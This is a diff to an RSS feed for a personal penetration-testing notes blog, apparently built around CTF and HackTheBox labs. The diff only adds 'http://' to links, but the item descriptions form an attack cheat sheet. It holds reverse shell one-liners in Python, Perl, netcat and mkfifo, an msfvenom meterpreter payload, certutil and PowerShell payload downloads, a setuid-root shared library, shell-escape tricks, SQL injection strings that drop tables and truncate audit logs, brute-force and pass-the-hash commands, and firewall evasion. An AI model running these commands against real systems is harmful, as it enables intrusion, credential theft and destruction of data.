@@ -2,39 +2,39 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>pentest notes</title>
-    <link>sosprz.github.io/</link>
+    <link>http://sosprz.github.io/</link>
     <description>Recent content on pentest notes</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>Your language code</language>
     <lastBuildDate>Sat, 19 Jan 2019 22:13:07 +0100</lastBuildDate>
     
-	<atom:link href="sosprz.github.io/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="http://sosprz.github.io/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>Fuzz</title>
-      <link>sosprz.github.io/post/fuzz/</link>
+      <link>http://sosprz.github.io/post/fuzz/</link>
       <pubDate>Sat, 19 Jan 2019 22:13:07 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/fuzz/</guid>
+      <guid>http://sosprz.github.io/post/fuzz/</guid>
       <description>wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d &#34;username=FUZZ&amp;password=pass&#34; -hs &#34;not found&#34; http://10.10.10.10/login.php wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324  Fuzzing with ZAP request -&amp;gt; right click –&amp;gt; attack –&amp;gt; fuzzer</description>
     </item>
     
     <item>
       <title>Impacket</title>
-      <link>sosprz.github.io/post/impacket/</link>
+      <link>http://sosprz.github.io/post/impacket/</link>
       <pubDate>Sat, 19 Jan 2019 22:13:07 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/impacket/</guid>
+      <guid>http://sosprz.github.io/post/impacket/</guid>
       <description>Impacket psexec.py administrator@10.10.10.10</description>
     </item>
     
     <item>
       <title>Windows cmd</title>
-      <link>sosprz.github.io/post/windows-cmd/</link>
+      <link>http://sosprz.github.io/post/windows-cmd/</link>
       <pubDate>Sun, 30 Dec 2018 08:53:12 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/windows-cmd/</guid>
+      <guid>http://sosprz.github.io/post/windows-cmd/</guid>
       <description>Various commands  type get-content dir /ah whoami dir /s where /r c:\Windows bash.* START filenae.lnk where /r c:\ wsl.conf 
 How to download file wget wget http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe  Invoke-WebRequest Invoke-WebRequest http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe Certutil certutil.exe -urlcache -split -f http://10.10.10.10/file.xml file.xml
 Manage services Restart-Service -Name &amp;ldquo;Ubiquiti UniFi Video&amp;rdquo; Stop-Service -Name &amp;ldquo;Ubiquiti UniFi Video&amp;rdquo;</description>
@@ -42,28 +42,28 @@ Manage services Restart-Service -Name &amp;ldquo;Ubiquiti UniFi Video&amp;rdquo;
     
     <item>
       <title>Firewall evasion</title>
-      <link>sosprz.github.io/post/firewall-evasion/</link>
+      <link>http://sosprz.github.io/post/firewall-evasion/</link>
       <pubDate>Sun, 23 Dec 2018 11:26:23 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/firewall-evasion/</guid>
+      <guid>http://sosprz.github.io/post/firewall-evasion/</guid>
       <description>Firewall source port scan, found port 987 and bind to localhost.  /usr/bin/nmap 192.168.5.2 -Pn &amp;ndash;source-port=53 -f /usr/bin/ncat -l 678 &amp;ndash;sh-exec &amp;ldquo;ncat 192.168.5.2 987 -p 53&amp;rdquo; ssh dave@localhost -p 678</description>
     </item>
     
     <item>
       <title>Antivirus evasion</title>
-      <link>sosprz.github.io/post/antivirus-evasion/</link>
+      <link>http://sosprz.github.io/post/antivirus-evasion/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/antivirus-evasion/</guid>
+      <guid>http://sosprz.github.io/post/antivirus-evasion/</guid>
       <description>https://github.com/oddcod3/Phantom-Evasion</description>
     </item>
     
     <item>
       <title>Bash commands</title>
-      <link>sosprz.github.io/post/bash-commands/</link>
+      <link>http://sosprz.github.io/post/bash-commands/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/bash-commands/</guid>
+      <guid>http://sosprz.github.io/post/bash-commands/</guid>
       <description>#www server  python -m SimpleHTTPServer 8000 
 #on our kali machine we run:
 nc -lvnp 7734
@@ -80,39 +80,39 @@ cat lists |sed &amp;rsquo;s/^.*://&amp;rsquo; &amp;gt; md5 awk -F &amp;ldquo;:&a
     
     <item>
       <title>Bash scripts</title>
-      <link>sosprz.github.io/post/bash-scrips/</link>
+      <link>http://sosprz.github.io/post/bash-scrips/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/bash-scrips/</guid>
+      <guid>http://sosprz.github.io/post/bash-scrips/</guid>
       <description>Ping #!/bin/bash echo &amp;ldquo;first three octets of network to scan, end with a .&amp;rdquo; read network for host in {1..254}; do ping -c1 $network$host &amp;amp;&amp;gt;/dev/null; [ $? -eq 0 ] &amp;amp;&amp;amp; echo &amp;ldquo;$network$host is up&amp;rdquo; echo &amp;ldquo;done checking host: &amp;ldquo; $network$host done 
 Portscan #!/bin/bash echo &amp;ldquo;host to portscan: &amp;ldquo; read host for port in {1..65000}; do (echo &amp;gt; /dev/tcp/$host/$port) &amp;amp;&amp;gt;/dev/null [ $? -eq 0 ] &amp;amp;&amp;amp; echo &amp;ldquo;$port open&amp;rdquo; done</description>
     </item>
     
     <item>
       <title>CTF tools</title>
-      <link>sosprz.github.io/post/ctf-tools/</link>
+      <link>http://sosprz.github.io/post/ctf-tools/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/ctf-tools/</guid>
+      <guid>http://sosprz.github.io/post/ctf-tools/</guid>
       <description>#pspy 32 &amp;amp; 64 bit
 https://github.com/DominicBreuker/pspy</description>
     </item>
     
     <item>
       <title>LDAP</title>
-      <link>sosprz.github.io/post/ldap/</link>
+      <link>http://sosprz.github.io/post/ldap/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/ldap/</guid>
+      <guid>http://sosprz.github.io/post/ldap/</guid>
       <description>jxplorer</description>
     </item>
     
     <item>
       <title>Links</title>
-      <link>sosprz.github.io/post/links/</link>
+      <link>http://sosprz.github.io/post/links/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/links/</guid>
+      <guid>http://sosprz.github.io/post/links/</guid>
       <description>#tools
 https://gtfobins.github.io/
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
@@ -126,38 +126,38 @@ https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/ htt
     
     <item>
       <title>Metasploit</title>
-      <link>sosprz.github.io/post/metasploit/</link>
+      <link>http://sosprz.github.io/post/metasploit/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/metasploit/</guid>
+      <guid>http://sosprz.github.io/post/metasploit/</guid>
       <description>#ssh user enum search enumusers use options set USER_FILE run 
 #php, image reverse shell #php4,php5  msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.1 lport=8888 -f raw msfconsole handler -p php/meterpreter/reverse_tcp -P 8888 -H 192.168.0.1</description>
     </item>
     
     <item>
       <title>Nmap</title>
-      <link>sosprz.github.io/post/nmap/</link>
+      <link>http://sosprz.github.io/post/nmap/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/nmap/</guid>
+      <guid>http://sosprz.github.io/post/nmap/</guid>
       <description>nmap -sC -sV -oA nmap/hostname ip nmap -c -v -max-retires=0 -t5 -p- 10.10.10.10  nmap -n -T4 -sS -sV -sC -oA nmap/hostname ip nmap -v -sS -p- -A -T4 -oA nmap/hostname ip nmap -v -sU -sS -p- -A -T4 -oA nmap/hostname ip nmap -p 80 &amp;ndash;script http-shellshock &amp;ndash;script-args uri=/cgi-bin/vulnscript.sh ip nmap -p 3306 &amp;ndash;script mysql-brute ip nmap -sV &amp;ndash;script=http-enum ip nmap -sV &amp;ndash;script=nfs-showmount ip nmap -sV &amp;ndash;script ssl-enum-ciphers -p 443 ip nmap -p445 &amp;ndash;script smb-vuln-ms17-010 ip nmap &amp;ndash;script smb-brute.</description>
     </item>
     
     <item>
       <title>OpenSSL</title>
-      <link>sosprz.github.io/post/openssl/</link>
+      <link>http://sosprz.github.io/post/openssl/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/openssl/</guid>
+      <guid>http://sosprz.github.io/post/openssl/</guid>
       <description>https://github.com/glv2/bruteforce-salted-openssl</description>
     </item>
     
     <item>
       <title>Passwords</title>
-      <link>sosprz.github.io/post/password/</link>
+      <link>http://sosprz.github.io/post/password/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/password/</guid>
+      <guid>http://sosprz.github.io/post/password/</guid>
       <description>#john
 john &amp;ndash;format=crypt &amp;ndash;wordlist=rockyou.txt &amp;ndash;session=two hashes.txt john &amp;ndash;format=NT &amp;ndash;rules -w=/usr/share/wordlists/rockyou.txt hashfile.txt
 john &amp;ndash;format=netntlmv2 hash.txt &amp;ndash;wordlist=/usr/share/wordlists/rockyou.txt #hydra hydra -l admin docker.hackthebox.eu -s 44661 -P /usr/share/wordlists/rockyou.txt http-post-form &amp;lsquo;/index.php:password=^PASS^:F=Invalid password!&amp;rsquo; hydra -L users -P passwords 10.10.10.111 ssh hydra 10.10.10.153 http-post-form &amp;ldquo;/moodle/login/index.php:username=^USER^&amp;amp;password=^PASS^:F=Invalid login, please try again&amp;rdquo; -l giovanni -P list -t 10 -w 30 hash-identifier
@@ -166,19 +166,19 @@ john &amp;ndash;format=netntlmv2 hash.txt &amp;ndash;wordlist=/usr/share/wordlis
     
     <item>
       <title>Privilege escalation</title>
-      <link>sosprz.github.io/post/privesc/</link>
+      <link>http://sosprz.github.io/post/privesc/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/privesc/</guid>
+      <guid>http://sosprz.github.io/post/privesc/</guid>
       <description>#!/bin/sh cp /bin/dash /tmp/privest chmod 4755 /tmp/privesc</description>
     </item>
     
     <item>
       <title>Privilege escalation - libseclogin</title>
-      <link>sosprz.github.io/post/privesc-libseclogin/</link>
+      <link>http://sosprz.github.io/post/privesc-libseclogin/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/privesc-libseclogin/</guid>
+      <guid>http://sosprz.github.io/post/privesc-libseclogin/</guid>
       <description>touch libseclogin.c  #include  #include  #include  #include  void seclogin() { setuid(0); setgid(0); execl(&amp;ldquo;/bin/bash&amp;rdquo;,&amp;ldquo;sh&amp;rdquo;,(char *)0); } int main(void) { seclogin(); } 
 Compile the code with /usr/share/bash-completion/completions/gcc -shared -o libseclogin.so -fPIC libseclogin.c
  cp libseclogin.so to /tmp cd /etc/ld.so.conf.d ldconfig test.conf #(test.conf write /tmp) #it will give this output
@@ -188,38 +188,38 @@ Second run:</description>
     
     <item>
       <title>Python</title>
-      <link>sosprz.github.io/post/python/</link>
+      <link>http://sosprz.github.io/post/python/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/python/</guid>
+      <guid>http://sosprz.github.io/post/python/</guid>
       <description>cat users.txt | python -m json.tool
 python -m SimpleHTTPServer 8000</description>
     </item>
     
     <item>
       <title>Reverse-engineering</title>
-      <link>sosprz.github.io/post/reverse-engineering/</link>
+      <link>http://sosprz.github.io/post/reverse-engineering/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/reverse-engineering/</guid>
+      <guid>http://sosprz.github.io/post/reverse-engineering/</guid>
       <description>radare2</description>
     </item>
     
     <item>
       <title>SMB</title>
-      <link>sosprz.github.io/post/smb/</link>
+      <link>http://sosprz.github.io/post/smb/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/smb/</guid>
+      <guid>http://sosprz.github.io/post/smb/</guid>
       <description> smbclient #user % hash smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY -L 10.10.10.107 #Allow to login to smb share smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY \\\\10.10.10.107\\alice  smbmap smbmap -H 10.10.10.10 -u test -p &#39;test&#39; -d domain.com </description>
     </item>
     
     <item>
       <title>SQLi</title>
-      <link>sosprz.github.io/post/sqli/</link>
+      <link>http://sosprz.github.io/post/sqli/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/sqli/</guid>
+      <guid>http://sosprz.github.io/post/sqli/</guid>
       <description>#sql injection userName = Smith&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1 userName =&amp;rsquo; or 1=1 &amp;ndash; userID = 1234567 or 1=1 UserName = Smith’;drop table users; truncate audit_log;&amp;ndash;
 User&amp;rsquo;+&amp;rsquo;
 
@@ -228,39 +228,39 @@ Themole</description>
     
     <item>
       <title>SSH</title>
-      <link>sosprz.github.io/post/ssh/</link>
+      <link>http://sosprz.github.io/post/ssh/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/ssh/</guid>
+      <guid>http://sosprz.github.io/post/ssh/</guid>
       <description>#putty puttygen my_private_key.ppk -O private-openssh -o keyfile
 #ssh ssh -i keyfile root@10.10.10.107</description>
     </item>
     
     <item>
       <title>Shell</title>
-      <link>sosprz.github.io/post/shell/</link>
+      <link>http://sosprz.github.io/post/shell/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/shell/</guid>
+      <guid>http://sosprz.github.io/post/shell/</guid>
       <description> export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python -c import pty; pty.spawn(&#34;/bin/bash&#34;) python3 -c import pty; pty.spawn(&#39;/bin/bash&#39;) echo os.system(&#39;/bin/bash&#39;) /bin/sh -i echo &#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;  /tmp/asdf.py python /tmp/asdf.py  </description>
     </item>
     
     <item>
       <title>Shell escape</title>
-      <link>sosprz.github.io/post/shell-esc/</link>
+      <link>http://sosprz.github.io/post/shell-esc/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/shell-esc/</guid>
+      <guid>http://sosprz.github.io/post/shell-esc/</guid>
       <description>export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH export SHELL=/bin/bash
 tar cf /dev/null ~/b &amp;ndash;checkpoint=1 &amp;ndash;checkpoint-action=exec=/bin/bash</description>
     </item>
     
     <item>
       <title>Shell reverse</title>
-      <link>sosprz.github.io/post/shell-reverse/</link>
+      <link>http://sosprz.github.io/post/shell-reverse/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/shell-reverse/</guid>
+      <guid>http://sosprz.github.io/post/shell-reverse/</guid>
       <description>python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
 perl -e &amp;lsquo;use Socket;$i=&amp;ldquo;10.10.10.10&amp;rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;ldquo;tcp&amp;rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDOUT,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDERR,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);exec(&amp;ldquo;/bin/sh -i&amp;rdquo;);};&amp;rsquo;
 nc -e /bin/sh 10.0.0.1 1234
@@ -274,58 +274,58 @@ ipv6  rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 |
     
     <item>
       <title>Sqlmap</title>
-      <link>sosprz.github.io/post/sqlmap/</link>
+      <link>http://sosprz.github.io/post/sqlmap/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/sqlmap/</guid>
+      <guid>http://sosprz.github.io/post/sqlmap/</guid>
       <description>&amp;ndash;dbs &amp;ndash;tables -D &amp;ndash;columns -D master -T sys.master_key_passwords &amp;ndash;dump -D master -T sys.master_key_passwords -f -b &amp;ndash;current-db &amp;ndash;current-user &amp;ndash;users &amp;ndash;passwords -v 1
 sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1 &amp;ndash;sql-query=&amp;ldquo;EXEC master..xp_dirtree &amp;lsquo;\\10.10.18.70\test&amp;rsquo; &amp;ndash; &amp;ldquo;</description>
     </item>
     
     <item>
       <title>Stego</title>
-      <link>sosprz.github.io/post/stego/</link>
+      <link>http://sosprz.github.io/post/stego/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/stego/</guid>
+      <guid>http://sosprz.github.io/post/stego/</guid>
       <description> Steghide steghide info file steghide export -sf file.jpg Foremost foremost -i file Strings strings file Binwalk binwalk file binwalk -e file Stegsolve https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve Wavsteg python3 WavSteg.py -r -s soundfile -o outputfile Stegcracker ./stegcracker ../../Hackthebox/Stego/beatles/BAND.JPG ../../app/rockyou.txt Unicode https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder Nipiet online https://www.bertnase.de/npiet/npiet-execute.php Decode online http://dcode.fr  </description>
     </item>
     
     <item>
       <title>Tunnels</title>
-      <link>sosprz.github.io/post/tunnels/</link>
+      <link>http://sosprz.github.io/post/tunnels/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/tunnels/</guid>
+      <guid>http://sosprz.github.io/post/tunnels/</guid>
       <description>Chisel  chisel 
 Proxychains  proxychinas</description>
     </item>
     
     <item>
       <title>WWW dir scan</title>
-      <link>sosprz.github.io/post/www-dir-scan/</link>
+      <link>http://sosprz.github.io/post/www-dir-scan/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/www-dir-scan/</guid>
+      <guid>http://sosprz.github.io/post/www-dir-scan/</guid>
       <description> dirb -h cewl seclists gobuster -u http://10.10.10.111:1880 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt gobuster -u http://10.10.10.111:9999/backup -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt #with -x -m it will be search txt,html gobuster -u http://10.10.10.111/dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x -m gobuster -u http://10.10.10.111/dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x html  #vhost enum nmap &amp;ndash;script http-vhosts -p 80,443 10.10.10.113 
  git clone https://github.com/jobertabma/virtual-host-discovery ruby scan.rb --ip=10.10.10.1 --host=domein.ltd -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt  </description>
     </item>
     
     <item>
       <title>XSS</title>
-      <link>sosprz.github.io/post/xss/</link>
+      <link>http://sosprz.github.io/post/xss/</link>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
-      <guid>sosprz.github.io/post/xss/</guid>
+      <guid>http://sosprz.github.io/post/xss/</guid>
       <description>xsser -u</description>
     </item>
     
     <item>
       <title>About</title>
-      <link>sosprz.github.io/page/about/</link>
+      <link>http://sosprz.github.io/page/about/</link>
       <pubDate>Mon, 09 Apr 2018 00:00:00 +0000</pubDate>
       
-      <guid>sosprz.github.io/page/about/</guid>
+      <guid>http://sosprz.github.io/page/about/</guid>
       <description>Pentest notes by lnxuserpl@gmail.com
 Theme based on https://themes.gohugo.io/hugo-gentoo-theme/</description>
     </item>
